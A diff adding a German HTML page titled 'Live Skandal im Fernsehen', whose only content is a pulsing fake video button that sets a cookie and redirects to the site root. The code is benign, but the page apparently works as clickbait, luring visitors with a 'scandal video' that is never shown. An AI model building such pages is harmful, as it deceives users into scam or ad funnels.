@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Live Skandal im Fernsehen</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      overflow: hidden;
+    }
+    #pulse-button {
+      position: relative;
+      width: 90%;
+      max-width: 400px;
+      cursor: pointer;
+      border: none;
+      background: none;
+      outline: none;
+    }
+    #pulse-button::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      width: 100px;
+      height: 100px;
+      background: rgba(255, 0, 0, 0.5);
+      border-radius: 50%;
+      transform: translate(-50%, -50%);
+      animation: pulse 1.5s infinite;
+      z-index: 1;
+    }
+    #pulse-button img {
+      width: 100%;
+      border-radius: 10px;
+      position: relative;
+      z-index: 2;
+    }
+    @keyframes pulse {
+      0% {
+        transform: translate(-50%, -50%) scale(1);
+        opacity: 0.7;
+      }
+      70% {
+        transform: translate(-50%, -50%) scale(1.5);
+        opacity: 0;
+      }
+      100% {
+        transform: translate(-50%, -50%) scale(1);
+        opacity: 0;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<button id="pulse-button">
+  <img src="https://ibb.co/2YKzCxh8" alt="Live Skandal Video">
+</button>
+
+<script>
+  document.getElementById('pulse-button').addEventListener('click', function() {
+    document.cookie = "visited=true; Max-Age=86400; Path=/; Secure";
+    window.location.href = "/";
+  });
+</script>
+
+</body>
+</html>
